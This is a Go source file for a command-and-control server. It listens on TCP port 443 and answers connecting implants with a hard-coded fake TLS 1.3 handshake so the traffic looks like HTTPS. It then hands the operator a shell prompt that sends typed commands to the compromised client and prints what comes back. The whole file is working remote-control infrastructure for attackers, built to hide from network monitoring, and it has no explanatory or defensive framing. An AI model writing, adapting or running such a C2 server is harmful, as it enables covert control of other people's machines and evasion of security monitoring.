package main

import (
        "bufio"
        "bytes"
        "fmt"
        "encoding/hex"
        "net"
        "os"
)

const (
        SERVER_PORT = "443"
        SERVER_TYPE = "tcp"
)

func main() {
        fmt.Println("[+] Starting C2 server")
        server, err := net.Listen(SERVER_TYPE, ":" + SERVER_PORT)
        if err != nil {
                fmt.Println("[-] Error listening: ", err.Error())
                os.Exit(1)
        }
        defer server.Close()
        fmt.Printf("[+] Listening on %s\n", server.Addr().String())
        client_num := 1;
        for {
                connection, err := server.Accept()
                if err != nil {
                        fmt.Println("[-] Error accepting: ", err.Error())
                        os.Exit(1)
                }
                fmt.Printf("[+] Connected to CLIENT_%d (%s)\n", client_num, connection.RemoteAddr())
                client_num++
                serverHello(connection)
                processClient(connection)
        }
}

func serverHello(connection net.Conn) {
        buffer := make([]byte, 5000)
        mLen, err := connection.Read(buffer)
        if err != nil {
                fmt.Println("Error reading:", err.Error())
        }

        if bytes.Compare(buffer[0:3], []byte{0x16, 0x03, 0x01}) != 0 {
                fmt.Println("[-] Invalid 'Client Hello'")
                return
        }

        fmt.Println("[+] Received 'Client Hello'")
        fmt.Printf("%s", hex.Dump([]byte(buffer[:mLen])))

        fmt.Println("[+] Sending 'Server Hello', 'Server Change Cipher Spec', 'Server Encrypted Extensions',\n",
                     "           'Server Certificate', 'Server Certificate Verify', 'Server Handshake Finished'")
        _, err = connection.Write([]byte{0x16, 0x03, 0x03, 0x00, 0x7a, 0x02, 0x00, 0x00, 0x76, 0x03, 0x03, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e, 0x7f, 
0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x20, 0xe0, 0xe1, 0xe2, 0xe3, 0xe4, 0xe5, 0xe6, 
0xe7, 0xe8, 0xe9, 0xea, 0xeb, 0xec, 0xed, 0xee, 0xef, 0xf0, 0xf1, 0xf2, 0xf3, 0xf4, 0xf5, 0xf6, 0xf7, 0xf8, 0xf9, 0xfa, 0xfb, 0xfc, 0xfd, 0xfe, 
0xff, 0x13, 0x02, 0x00, 0x00, 0x2e, 0x00, 0x2b, 0x00, 0x02, 0x03, 0x04, 0x00, 0x33, 0x00, 0x24, 0x00, 0x1d, 0x00, 0x20, 0x9f, 0xd7, 0xad, 0x6d, 
0xcf, 0xf4, 0x29, 0x8d, 0xd3, 0xf9, 0x6d, 0x5b, 0x1b, 0x2a, 0xf9, 0x10, 0xa0, 0x53, 0x5b, 0x14, 0x88, 0xd7, 0xf8, 0xfa, 0xbb, 0x34, 0x9a, 0x98, 
0x28, 0x80, 0xb6, 0x15})

        _, err = connection.Write([]byte{0x14, 0x03, 0x03, 0x00, 0x01, 0x01})
        _, err = connection.Write([]byte{0x17, 0x03, 0x03, 0x00, 0x17, 0x6b, 0xe0, 0x2f, 0x9d, 0xa7, 0xc2, 0xdc, 0x9d, 0xde, 0xf5, 0x6f, 0x24, 0x68, 0xb9, 0x0a, 0xdf, 0xa2, 0x51, 0x01, 0xab, 0x03, 0x44, 0xae})
        _, err = connection.Write([]byte{0x17, 0x03, 0x03, 0x03, 0x43, 0xba, 0xf0, 0x0a, 0x9b, 0xe5, 0x0f, 0x3f, 0x23, 0x07, 0xe7, 0x26, 0xed, 0xcb, 0xda, 0xcb, 0xe4, 0xb1, 0x86, 0x16, 0x44, 0x9d, 
0x46, 0xc6, 0x20, 0x7a, 0xf6, 0xe9, 0x95, 0x3e, 0xe5, 0xd2, 0x41, 0x1b, 0xa6, 0x5d, 0x31, 0xfe, 0xaf, 0x4f, 0x78, 0x76, 0x4f, 0x2d, 0x69, 0x39, 0x87, 0x18, 
0x6c, 0xc0, 0x13, 0x29, 0xc1, 0x87, 0xa5, 0xe4, 0x60, 0x8e, 0x8d, 0x27, 0xb3, 0x18, 0xe9, 0x8d, 0xd9, 0x47, 0x69, 0xf7, 0x73, 0x9c, 0xe6, 0x76, 0x83, 0x92, 
0xca, 0xca, 0x8d, 0xcc, 0x59, 0x7d, 0x77, 0xec, 0x0d, 0x12, 0x72, 0x23, 0x37, 0x85, 0xf6, 0xe6, 0x9d, 0x6f, 0x43, 0xef, 0xfa, 0x8e, 0x79, 0x05, 0xed, 0xfd, 
0xc4, 0x03, 0x7e, 0xee, 0x59, 0x33, 0xe9, 0x90, 0xa7, 0x97, 0x2f, 0x20, 0x69, 0x13, 0xa3, 0x1e, 0x8d, 0x04, 0x93, 0x13, 0x66, 0xd3, 0xd8, 0xbc, 0xd6, 0xa4, 
0xa4, 0xd6, 0x47, 0xdd, 0x4b, 0xd8, 0x0b, 0x0f, 0xf8, 0x63, 0xce, 0x35, 0x54, 0x83, 0x3d, 0x74, 0x4c, 0xf0, 0xe0, 0xb9, 0xc0, 0x7c, 0xae, 0x72, 0x6d, 0xd2, 
0x3f, 0x99, 0x53, 0xdf, 0x1f, 0x1c, 0xe3, 0xac, 0xeb, 0x3b, 0x72, 0x30, 0x87, 0x1e, 0x92, 0x31, 0x0c, 0xfb, 0x2b, 0x09, 0x84, 0x86, 0xf4, 0x35, 0x38, 0xf8, 
0xe8, 0x2d, 0x84, 0x04, 0xe5, 0xc6, 0xc2, 0x5f, 0x66, 0xa6, 0x2e, 0xbe, 0x3c, 0x5f, 0x26, 0x23, 0x26, 0x40, 0xe2, 0x0a, 0x76, 0x91, 0x75, 0xef, 0x83, 0x48, 
0x3c, 0xd8, 0x1e, 0x6c, 0xb1, 0x6e, 0x78, 0xdf, 0xad, 0x4c, 0x1b, 0x71, 0x4b, 0x04, 0xb4, 0x5f, 0x6a, 0xc8, 0xd1, 0x06, 0x5a, 0xd1, 0x8c, 0x13, 0x45, 0x1c, 
0x90, 0x55, 0xc4, 0x7d, 0xa3, 0x00, 0xf9, 0x35, 0x36, 0xea, 0x56, 0xf5, 0x31, 0x98, 0x6d, 0x64, 0x92, 0x77, 0x53, 0x93, 0xc4, 0xcc, 0xb0, 0x95, 0x46, 0x70, 
0x92, 0xa0, 0xec, 0x0b, 0x43, 0xed, 0x7a, 0x06, 0x87, 0xcb, 0x47, 0x0c, 0xe3, 0x50, 0x91, 0x7b, 0x0a, 0xc3, 0x0c, 0x6e, 0x5c, 0x24, 0x72, 0x5a, 0x78, 0xc4, 
0x5f, 0x9f, 0x5f, 0x29, 0xb6, 0x62, 0x68, 0x67, 0xf6, 0xf7, 0x9c, 0xe0, 0x54, 0x27, 0x35, 0x47, 0xb3, 0x6d, 0xf0, 0x30, 0xbd, 0x24, 0xaf, 0x10, 0xd6, 0x32, 
0xdb, 0xa5, 0x4f, 0xc4, 0xe8, 0x90, 0xbd, 0x05, 0x86, 0x92, 0x8c, 0x02, 0x06, 0xca, 0x2e, 0x28, 0xe4, 0x4e, 0x22, 0x7a, 0x2d, 0x50, 0x63, 0x19, 0x59, 0x35, 
0xdf, 0x38, 0xda, 0x89, 0x36, 0x09, 0x2e, 0xef, 0x01, 0xe8, 0x4c, 0xad, 0x2e, 0x49, 0xd6, 0x2e, 0x47, 0x0a, 0x6c, 0x77, 0x45, 0xf6, 0x25, 0xec, 0x39, 0xe4, 
0xfc, 0x23, 0x32, 0x9c, 0x79, 0xd1, 0x17, 0x28, 0x76, 0x80, 0x7c, 0x36, 0xd7, 0x36, 0xba, 0x42, 0xbb, 0x69, 0xb0, 0x04, 0xff, 0x55, 0xf9, 0x38, 0x50, 0xdc, 
0x33, 0xc1, 0xf9, 0x8a, 0xbb, 0x92, 0x85, 0x83, 0x24, 0xc7, 0x6f, 0xf1, 0xeb, 0x08, 0x5d, 0xb3, 0xc1, 0xfc, 0x50, 0xf7, 0x4e, 0xc0, 0x44, 0x42, 0xe6, 0x22, 
0x97, 0x3e, 0xa7, 0x07, 0x43, 0x41, 0x87, 0x94, 0xc3, 0x88, 0x14, 0x0b, 0xb4, 0x92, 0xd6, 0x29, 0x4a, 0x05, 0x40, 0xe5, 0xa5, 0x9c, 0xfa, 0xe6, 0x0b, 0xa0, 
0xf1, 0x48, 0x99, 0xfc, 0xa7, 0x13, 0x33, 0x31, 0x5e, 0xa0, 0x83, 0xa6, 0x8e, 0x1d, 0x7c, 0x1e, 0x4c, 0xdc, 0x2f, 0x56, 0xbc, 0xd6, 0x11, 0x96, 0x81, 0xa4, 
0xad, 0xbc, 0x1b, 0xbf, 0x42, 0xaf, 0xd8, 0x06, 0xc3, 0xcb, 0xd4, 0x2a, 0x07, 0x6f, 0x54, 0x5d, 0xee, 0x4e, 0x11, 0x8d, 0x0b, 0x39, 0x67, 0x54, 0xbe, 0x2b, 
0x04, 0x2a, 0x68, 0x5d, 0xd4, 0x72, 0x7e, 0x89, 0xc0, 0x38, 0x6a, 0x94, 0xd3, 0xcd, 0x6e, 0xcb, 0x98, 0x20, 0xe9, 0xd4, 0x9a, 0xfe, 0xed, 0x66, 0xc4, 0x7e, 
0x6f, 0xc2, 0x43, 0xea, 0xbe, 0xbb, 0xcb, 0x0b, 0x02, 0x45, 0x38, 0x77, 0xf5, 0xac, 0x5d, 0xbf, 0xbd, 0xf8, 0xdb, 0x10, 0x52, 0xa3, 0xc9, 0x94, 0xb2, 0x24, 
0xcd, 0x9a, 0xaa, 0xf5, 0x6b, 0x02, 0x6b, 0xb9, 0xef, 0xa2, 0xe0, 0x13, 0x02, 0xb3, 0x64, 0x01, 0xab, 0x64, 0x94, 0xe7, 0x01, 0x8d, 0x6e, 0x5b, 0x57, 0x3b, 
0xd3, 0x8b, 0xce, 0xf0, 0x23, 0xb1, 0xfc, 0x92, 0x94, 0x6b, 0xbc, 0xa0, 0x20, 0x9c, 0xa5, 0xfa, 0x92, 0x6b, 0x49, 0x70, 0xb1, 0x00, 0x91, 0x03, 0x64, 0x5c, 
0xb1, 0xfc, 0xfe, 0x55, 0x23, 0x11, 0xff, 0x73, 0x05, 0x58, 0x98, 0x43, 0x70, 0x03, 0x8f, 0xd2, 0xcc, 0xe2, 0xa9, 0x1f, 0xc7, 0x4d, 0x6f, 0x3e, 0x3e, 0xa9, 
0xf8, 0x43, 0xee, 0xd3, 0x56, 0xf6, 0xf8, 0x2d, 0x35, 0xd0, 0x3b, 0xc2, 0x4b, 0x81, 0xb5, 0x8c, 0xeb, 0x1a, 0x43, 0xec, 0x94, 0x37, 0xe6, 0xf1, 0xe5, 0x0e, 
0xb6, 0xf5, 0x55, 0xe3, 0x21, 0xfd, 0x67, 0xc8, 0x33, 0x2e, 0xb1, 0xb8, 0x32, 0xaa, 0x8d, 0x79, 0x5a, 0x27, 0xd4, 0x79, 0xc6, 0xe2, 0x7d, 0x5a, 0x61, 0x03, 
0x46, 0x83, 0x89, 0x19, 0x03, 0xf6, 0x64, 0x21, 0xd0, 0x94, 0xe1, 0xb0, 0x0a, 0x9a, 0x13, 0x8d, 0x86, 0x1e, 0x6f, 0x78, 0xa2, 0x0a, 0xd3, 0xe1, 0x58, 0x00, 
0x54, 0xd2, 0xe3, 0x05, 0x25, 0x3c, 0x71, 0x3a, 0x02, 0xfe, 0x1e, 0x28, 0xde, 0xee, 0x73, 0x36, 0x24, 0x6f, 0x6a, 0xe3, 0x43, 0x31, 0x80, 0x6b, 0x46, 0xb4, 
0x7b, 0x83, 0x3c, 0x39, 0xb9, 0xd3, 0x1c, 0xd3, 0x00, 0xc2, 0xa6, 0xed, 0x83, 0x13, 0x99, 0x77, 0x6d, 0x07, 0xf5, 0x70, 0xea, 0xf0, 0x05, 0x9a, 0x2c, 0x68, 
0xa5, 0xf3, 0xae, 0x16, 0xb6, 0x17, 0x40, 0x4a, 0xf7, 0xb7, 0x23, 0x1a, 0x4d, 0x94, 0x27, 0x58, 0xfc, 0x02, 0x0b, 0x3f, 0x23, 0xee, 0x8c, 0x15, 0xe3, 0x60, 
0x44, 0xcf, 0xd6, 0x7c, 0xd6, 0x40, 0x99, 0x3b, 0x16, 0x20, 0x75, 0x97, 0xfb, 0xf3, 0x85, 0xea, 0x7a, 0x4d, 0x99, 0xe8, 0xd4, 0x56, 0xff, 0x83, 0xd4, 0x1f, 
0x7b, 0x8b, 0x4f, 0x06, 0x9b, 0x02, 0x8a, 0x2a, 0x63, 0xa9, 0x19, 0xa7, 0x0e, 0x3a, 0x10, 0xe3, 0x08, 0x41, 0x58, 0xfa, 0xa5, 0xba, 0xfa, 0x30, 0x18, 0x6c, 
0x6b, 0x2f, 0x23, 0x8e, 0xb5, 0x30, 0xc7, 0x3e})
        _, err = connection.Write([]byte{0x17, 0x03, 0x03, 0x01, 0x19, 0x73, 0x71, 0x9f, 0xce, 0x07, 0xec, 0x2f, 0x6d, 0x3b, 0xba, 0x02, 
0x92, 0xa0, 0xd4, 0x0b, 0x27, 0x70, 0xc0, 0x6a, 0x27, 0x17, 0x99, 0xa5, 0x33, 0x14, 0xf6, 0xf7, 
0x7f, 0xc9, 0x5c, 0x5f, 0xe7, 0xb9, 0xa4, 0x32, 0x9f, 0xd9, 0x54, 0x8c, 0x67, 0x0e, 0xbe, 0xea, 
0x2f, 0x2d, 0x5c, 0x35, 0x1d, 0xd9, 0x35, 0x6e, 0xf2, 0xdc, 0xd5, 0x2e, 0xb1, 0x37, 0xbd, 0x3a, 
0x67, 0x65, 0x22, 0xf8, 0xcd, 0x0f, 0xb7, 0x56, 0x07, 0x89, 0xad, 0x7b, 0x0e, 0x3c, 0xab, 0xa2, 
0xe3, 0x7e, 0x6b, 0x41, 0x99, 0xc6, 0x79, 0x3b, 0x33, 0x46, 0xed, 0x46, 0xcf, 0x74, 0x0a, 0x9f, 
0xa1, 0xfe, 0xc4, 0x14, 0xdc, 0x71, 0x5c, 0x41, 0x5c, 0x60, 0xe5, 0x75, 0x70, 0x3c, 0xe6, 0xa3, 
0x4b, 0x70, 0xb5, 0x19, 0x1a, 0xa6, 0xa6, 0x1a, 0x18, 0xfa, 0xff, 0x21, 0x6c, 0x68, 0x7a, 0xd8, 
0xd1, 0x7e, 0x12, 0xa7, 0xe9, 0x99, 0x15, 0xa6, 0x11, 0xbf, 0xc1, 0xa2, 0xbe, 0xfc, 0x15, 0xe6, 
0xe9, 0x4d, 0x78, 0x46, 0x42, 0xe6, 0x82, 0xfd, 0x17, 0x38, 0x2a, 0x34, 0x8c, 0x30, 0x10, 0x56, 
0xb9, 0x40, 0xc9, 0x84, 0x72, 0x00, 0x40, 0x8b, 0xec, 0x56, 0xc8, 0x1e, 0xa3, 0xd7, 0x21, 0x7a, 
0xb8, 0xe8, 0x5a, 0x88, 0x71, 0x53, 0x95, 0x89, 0x9c, 0x90, 0x58, 0x7f, 0x72, 0xe8, 0xdd, 0xd7, 
0x4b, 0x26, 0xd8, 0xed, 0xc1, 0xc7, 0xc8, 0x37, 0xd9, 0xf2, 0xeb, 0xbc, 0x26, 0x09, 0x62, 0x21, 
0x90, 0x38, 0xb0, 0x56, 0x54, 0xa6, 0x3a, 0x0b, 0x12, 0x99, 0x9b, 0x4a, 0x83, 0x06, 0xa3, 0xdd, 
0xcc, 0x0e, 0x17, 0xc5, 0x3b, 0xa8, 0xf9, 0xc8, 0x03, 0x63, 0xf7, 0x84, 0x13, 0x54, 0xd2, 0x91, 
0xb4, 0xac, 0xe0, 0xc0, 0xf3, 0x30, 0xc0, 0xfc, 0xd5, 0xaa, 0x9d, 0xee, 0xf9, 0x69, 0xae, 0x8a, 
0xb2, 0xd9, 0x8d, 0xa8, 0x8e, 0xbb, 0x6e, 0xa8, 0x0a, 0x3a, 0x11, 0xf0, 0x0e, 0xa2, 0x96, 0xa3, 
0x23, 0x23, 0x67, 0xff, 0x07, 0x5e, 0x1c, 0x66, 0xdd, 0x9c, 0xbe, 0xdc, 0x47, 0x13})
        _, err = connection.Write([]byte{0x17, 0x03, 0x03, 0x00, 0x45, 0x10, 0x61, 0xde, 0x27, 0xe5, 0x1c, 0x2c, 0x9f, 0x34, 0x29, 0x11, 
0x80, 0x6f, 0x28, 0x2b, 0x71, 0x0c, 0x10, 0x63, 0x2c, 0xa5, 0x00, 0x67, 0x55, 0x88, 0x0d, 0xbf, 
0x70, 0x06, 0x00, 0x2d, 0x0e, 0x84, 0xfe, 0xd9, 0xad, 0xf2, 0x7a, 0x43, 0xb5, 0x19, 0x23, 0x03, 
0xe4, 0xdf, 0x5c, 0x28, 0x5d, 0x58, 0xe3, 0xc7, 0x62, 0x24, 0x07, 0x84, 0x40, 0xc0, 0x74, 0x23, 
0x74, 0x74, 0x4a, 0xec, 0xf2, 0x8c, 0xf3, 0x18, 0x2f, 0xd0})

        mLen2, err2 := connection.Read(buffer)
        if err2 != nil {
                fmt.Println("Error reading:", err2.Error())
        }

        if bytes.Compare(buffer[0:3], []byte{0x14, 0x03, 0x03}) != 0 {
                fmt.Println("[-] Invalid 'Client Change Cipher Spec'")
                return
        }

        fmt.Println("[+] Received 'Client Change Cipher Spec', 'Client Handshake Finished'")
        fmt.Printf("%s", hex.Dump([]byte(buffer[:mLen2])))
}

func processClient(connection net.Conn) {
//        stdoutDumper := hex.Dumper(os.Stdout)
//        defer stdoutDumper.Close()

//        for {
//        buffer := make([]byte, 50000)
//        mLen, err := connection.Read(buffer)
//        fmt.Println("\nLength: ", mLen)
//        if err != nil {
//                fmt.Println("Error reading:", err.Error())
//        }
        // fmt.Println("Received: ", string(buffer[:mLen]))
//        stdoutDumper.Write([]byte(buffer[:mLen]))

        for {
        consoleReader := bufio.NewReader(os.Stdin)
        fmt.Print("$ ")
        cmd, _ := consoleReader.ReadString('\n')

        connection.Write([]byte(cmd))
        buffer := make([]byte, 50000)
        mLen, _ := connection.Read(buffer)
//        if err != nil {
//                fmt.Println("Error reading:", err.Error())
//        }
        fmt.Println("Received: ", string(buffer[:mLen]))
        }
        // connection.Close()
}
